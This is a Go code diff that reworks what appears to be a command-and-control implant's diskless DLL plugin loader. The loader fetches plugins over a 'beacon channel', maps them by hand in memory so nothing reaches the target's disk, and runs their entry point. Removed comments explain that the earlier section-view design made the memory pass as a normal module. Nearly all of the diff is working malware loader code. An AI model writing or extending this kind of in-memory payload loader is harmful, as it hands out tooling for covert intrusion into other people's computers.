@@ -2,14 +2,11 @@
 
 // Diskless PE plugin loader.
 //
-// Plugins are DLL images fetched over the authenticated beacon channel
-// and mapped into a dedicated child process with an NT section object. Nothing is
-// ever written to the target disk: the bytes stay in memory from the
-// HTTP response to the mapped image. The image is mapped twice from one
-// section object, PAGE_READWRITE for staging and PAGE_EXECUTE_READ for
-// execution, so code pages are never writable and executable at the same
-// time and the mapped region is reported as MEM_IMAGE like a normal
-// module instead of private VirtualAlloc memory.
+// Plugins are DLL images fetched over the authenticated beacon channel and
+// manually mapped into a dedicated child process. Nothing is ever written to
+// the target disk: the bytes stay in memory from the HTTP response to the
+// mapped image. A writable staging allocation is copied into a separate image
+// allocation before per-section protections are applied.
 //
 // Only PE32+ amd64 images are supported. Manually mapped modules are not
 // registered with the Windows loader, so plugins must not rely on
@@ -40,26 +37,22 @@ const (
 	pageReadWrite        = 0x04
 	pageExecuteRead      = 0x20
 	pageExecuteReadWrite = 0x40
-	sectionAllAccess     = 0xF001F
-	sectionCommit        = 0x800000
-	sectionInheritUnmap  = 2
 	sectionPageSize      = 0x1000
+	memCommit            = 0x1000
+	memReserve           = 0x2000
+	memRelease           = 0x8000
 	pluginOutputBytes    = 1024 * 1024
 	imageScnMemExecute   = 0x20000000
 	imageScnMemWrite     = 0x80000000
 )
 
 var (
-	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
-	kernel32Mod              = syscall.NewLazyDLL("kernel32.dll")
-	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
-	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
-	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
-	procNtClose              = ntdll.NewProc("NtClose")
-	procGetCurrentProcess    = kernel32Mod.NewProc("GetCurrentProcess")
-	procLoadLibraryA         = kernel32Mod.NewProc("LoadLibraryA")
-	procGetProcAddress       = kernel32Mod.NewProc("GetProcAddress")
-	procVirtualProtect       = kernel32Mod.NewProc("VirtualProtect")
+	kernel32Mod        = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc   = kernel32Mod.NewProc("VirtualAlloc")
+	procVirtualFree    = kernel32Mod.NewProc("VirtualFree")
+	procLoadLibraryA   = kernel32Mod.NewProc("LoadLibraryA")
+	procGetProcAddress = kernel32Mod.NewProc("GetProcAddress")
+	procVirtualProtect = kernel32Mod.NewProc("VirtualProtect")
 )
 
 var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
@@ -156,16 +149,15 @@ func mapPluginPE(data []byte) (uintptr, error) {
 	if opt.SizeOfImage < opt.SizeOfHeaders || uint64(len(data)) < uint64(opt.SizeOfHeaders) {
 		return 0, errors.New("plugin PE is truncated")
 	}
-	rxBase, rwBase, section, err := mapPluginViews(opt.SizeOfImage)
+	rxBase, rwBase, err := mapPluginViews(opt.SizeOfImage)
 	if err != nil {
 		return 0, err
 	}
 	committed := false
 	defer func() {
 		if !committed {
-			unmapPluginView(rwBase)
-			unmapPluginView(rxBase)
-			procNtClose.Call(section)
+			releasePluginView(rwBase)
+			releasePluginView(rxBase)
 		}
 	}()
 	if rwBase == 0 || rxBase == 0 {
@@ -183,93 +175,46 @@ func mapPluginPE(data []byte) (uintptr, error) {
 	if err := resolvePluginImports(file, data, opt, rwBase); err != nil {
 		return 0, err
 	}
+	// The writable staging image contains the completed relocations and IAT.
+	// Copy it into the execution allocation before tightening protections.
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(rxBase)), int(opt.SizeOfImage)), unsafe.Slice((*byte)(unsafe.Pointer(rwBase)), int(opt.SizeOfImage)))
 	applyPluginProtections(rxBase, file, opt)
-	// Drop the writable alias; only the RX image view remains mapped.
-	unmapPluginView(rwBase)
-	procNtClose.Call(section)
+	// Drop the writable staging allocation; only the protected image remains.
+	releasePluginView(rwBase)
 	committed = true
 	if opt.AddressOfEntryPoint != 0 {
 		ret, _, _ := syscall.SyscallN(rxBase+uintptr(opt.AddressOfEntryPoint), rxBase, 1, 0)
 		if ret == 0 {
-			unmapPluginView(rxBase)
+			releasePluginView(rxBase)
 			return 0, errors.New("plugin DllMain rejected DLL_PROCESS_ATTACH")
 		}
 	}
 	return rxBase, nil
 }
 
-// mapPluginViews creates one NT section object and maps it twice: a
-// PAGE_READWRITE view for staging bytes and a PAGE_EXECUTE_READ view for
-// execution. Code is never writable and executable at the same time.
-func mapPluginViews(imageSize uint32) (uintptr, uintptr, uintptr, error) {
-	maxSize := int64((uintptr(imageSize) + sectionPageSize - 1) &^ (sectionPageSize - 1))
-	var handle uintptr
-	status, _, _ := procNtCreateSection.Call(
-		uintptr(unsafe.Pointer(&handle)),
-		sectionAllAccess,
-		0,
-		uintptr(unsafe.Pointer(&maxSize)),
-		pageExecuteReadWrite,
-		sectionCommit,
-		0,
-	)
-	if uintptr(status)>>63 != 0 {
-		return 0, 0, 0, fmt.Errorf("NtCreateSection failed with status 0x%x", uintptr(status))
+// mapPluginViews allocates separate writable staging and execution images.
+// The PE is still manually mapped; these allocations avoid section-view
+// behavior that can return an unusable base on some Windows targets.
+func mapPluginViews(imageSize uint32) (uintptr, uintptr, error) {
+	size := (uintptr(imageSize) + sectionPageSize - 1) &^ (sectionPageSize - 1)
+	rwBase, _, _ := procVirtualAlloc.Call(0, size, memReserve|memCommit, pageReadWrite)
+	if rwBase == 0 {
+		return 0, 0, errors.New("VirtualAlloc writable plugin image failed")
 	}
-	process, _, _ := procGetCurrentProcess.Call()
-	if process == 0 {
-		procNtClose.Call(handle)
-		return 0, 0, 0, errors.New("GetCurrentProcess returned a null handle")
+	rxBase, _, _ := procVirtualAlloc.Call(0, size, memReserve|memCommit, pageReadWrite)
+	if rxBase == 0 {
+		releasePluginView(rwBase)
+		return 0, 0, errors.New("VirtualAlloc execution plugin image failed")
 	}
-	mapView := func(protection uintptr) (uintptr, error) {
-		base := uintptr(0)
-		viewSize := uintptr(0)
-		status, _, _ := procNtMapViewOfSection.Call(
-			handle,
-			process,
-			uintptr(unsafe.Pointer(&base)),
-			0, 0, 0,
-			uintptr(unsafe.Pointer(&viewSize)),
-			sectionInheritUnmap,
-			0,
-			protection,
-		)
-		if uintptr(status)>>63 != 0 {
-			return 0, fmt.Errorf("NtMapViewOfSection failed with status 0x%x", uintptr(status))
-		}
-		if base == 0 {
-			return 0, errors.New("NtMapViewOfSection returned a null base")
-		}
-		if viewSize < uintptr(imageSize) {
-			unmapPluginView(base)
-			return 0, fmt.Errorf("NtMapViewOfSection returned a short view: 0x%x bytes", viewSize)
-		}
-		return base, nil
-	}
-	rwBase, err := mapView(pageReadWrite)
-	if err != nil {
-		procNtClose.Call(handle)
-		return 0, 0, 0, err
-	}
-	rxBase, err := mapView(pageExecuteRead)
-	if err != nil {
-		unmapPluginView(rwBase)
-		procNtClose.Call(handle)
-		return 0, 0, 0, err
-	}
-	return rxBase, rwBase, handle, nil
+	return rxBase, rwBase, nil
 }
 
-// unmapPluginView releases a view from the current process. The NT API takes
-// both the process handle and the view base address.
-func unmapPluginView(base uintptr) {
+// releasePluginView releases a manually allocated plugin image.
+func releasePluginView(base uintptr) {
 	if base == 0 {
 		return
 	}
-	process, _, _ := procGetCurrentProcess.Call()
-	if process != 0 {
-		procNtUnmapViewOfSection.Call(process, base)
-	}
+	procVirtualFree.Call(base, 0, memRelease)
 }
 
 // copyPluginImage copies the DOS/PE headers and every raw-backed section
